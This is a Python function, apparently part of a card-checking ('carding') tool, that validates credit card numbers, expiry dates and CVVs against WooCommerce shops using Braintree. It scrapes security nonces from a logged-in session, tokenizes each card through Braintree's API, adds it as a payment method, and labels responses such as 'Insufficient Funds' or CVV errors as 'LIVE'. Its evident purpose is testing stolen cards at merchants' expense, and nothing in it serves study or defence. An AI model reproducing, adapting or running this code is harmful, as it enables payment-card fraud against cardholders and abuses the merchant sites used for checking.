def check_card(session, web, cc, mm, yy, cvv, index, total):
    """Verifica una tarjeta individual"""
    print(f"\n{Color.CYAN}[{index}/{total}] Verificando en {web}: {cc}|{mm}|{yy}|{cvv}{Color.RESET}")
    
    try:
        url_add_pm = f"https://{web}/my-account/add-payment-method/"
        try:
            r = session.get(url_add_pm, verify=False, timeout=20)
        except Exception as e:
            return {"status": "error", "response": f"Connection error: {str(e)}", "card": f"{cc}|{mm}|{yy}|{cvv}"}
        
        if 'Log out' not in r.text:
            return {"status": "error", "response": "Session expired", "card": f"{cc}|{mm}|{yy}|{cvv}"}

        token_nonce_match = re.search(r'"client_token_nonce":"([^"]+)"', r.text)
        wc_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)

        if not token_nonce_match or not wc_nonce_match:
            return {"status": "error", "response": "No security nonces found", "card": f"{cc}|{mm}|{yy}|{cvv}"}

        token_nonce = token_nonce_match[1]
        wc_nonce = wc_nonce_match[1]

        ajax_url = f"https://{web}/wp-admin/admin-ajax.php"
        r_token = session.post(ajax_url, data={
            'action': 'wc_braintree_credit_card_get_client_token',
            '_ajax_nonce': token_nonce
        }, verify=False, timeout=20)
        
        try:
            token = r_token.json()['data']
            decoded = json.loads(base64.b64decode(token).decode('utf-8'))
            fingerprint = decoded['authorizationFingerprint']
            api_url = decoded['clientApiUrl']
        except:
            return {"status": "error", "response": "Failed to get Braintree token", "card": f"{cc}|{mm}|{yy}|{cvv}"}

        correlation_id = uuid.uuid4().hex
        bt_payload = {
            "creditCard": {
                "number": cc,
                "expirationMonth": mm,
                "expirationYear": yy,
                "cvv": cvv,
                "billingAddress": {"postalCode": "10001"}
            },
            "authorizationFingerprint": fingerprint,
            "braintreeLibraryVersion": "braintree/web/3.85.2",
            "_meta": {"merchantAppId": web, "platform": "web", "sdkVersion": "3.85.2", "source": "form", "deviceFingerprint": correlation_id}
        }
        
        r_bt = requests.post(f"{api_url}/v1/payment_methods/credit_cards", json=bt_payload, verify=False, timeout=20)
        bt_json = r_bt.json()
        
        if 'creditCards' not in bt_json:
            msg = bt_json.get('errors', [{}])[0].get('message', 'Braintree Declined')
            return {"status": "declined", "response": msg, "card": f"{cc}|{mm}|{yy}|{cvv}"}

        bt_nonce = bt_json['creditCards'][0]['nonce']
        card_type = bt_json['creditCards'][0]['type'].lower().replace(' ', '-')

        final_payload = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': card_type,
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': bt_nonce,
            'wc_braintree_device_data': '{"correlation_id":"' + correlation_id + '"}',
            'woocommerce-add-payment-method-nonce': wc_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1'
        }
        
        r_final = session.post(url_add_pm, data=final_payload, allow_redirects=True, verify=False, timeout=20)
        
        if "Payment method successfully added" in r_final.text:
            return {"status": "approved", "response": "CARD ADDED SUCCESSFULLY", "card": f"{cc}|{mm}|{yy}|{cvv}"}
        elif "Duplicate card exists in the vault" in r_final.text:
            return {"status": "approved", "response": "CARD ALREADY EXISTS (LIVE)", "card": f"{cc}|{mm}|{yy}|{cvv}"}
        else:
            err_match = re.search(r'class="woocommerce-error"[^>]*>(.*?)</li>', r_final.text, re.DOTALL)
            msg = re.sub('<[^>]*>', '', err_match[1]).strip() if err_match else "Card declined"
            
            cvv_incorrect_keywords = ["CVV", "CVV2", "CVC", "CID", "Security code", "verification"]
            cvv_incorrect = any(key in msg for key in cvv_incorrect_keywords)
            
            live_keywords = ["Insufficient Funds", "2010", "2001", "2046", "C2"]
            live_other = any(key in msg for key in live_keywords)
            
            if cvv_incorrect or live_other:
                return {"status": "approved", "response": f"LIVE - {msg}", "card": f"{cc}|{mm}|{yy}|{cvv}"}
            else:
                return {"status": "declined", "response": msg, "card": f"{cc}|{mm}|{yy}|{cvv}"}
                
    except Exception as e:
        return {"status": "error", "response": str(e), "card": f"{cc}|{mm}|{yy}|{cvv}"}

